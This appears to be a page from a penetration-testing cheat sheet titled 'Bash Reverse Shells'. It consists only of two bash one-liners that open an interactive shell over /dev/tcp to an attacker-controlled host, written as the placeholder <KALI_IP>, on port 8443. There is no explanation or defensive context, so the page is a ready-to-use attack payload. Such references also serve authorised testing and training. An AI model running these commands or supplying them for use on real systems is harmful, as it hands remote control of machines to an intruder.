---
title: Bash Reverse Shells
layout: default
nav_order: 2
parent: Reverse Shells

---

# Bash Reverse Shell
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

### Bash reverse shell
```bash
bash -i >& /dev/tcp/<KALI_IP>/8443 0>&1
```

```bash
/bin/bash -l > /dev/tcp/<KALI_IP>/8443 0<&1 2>&1
```

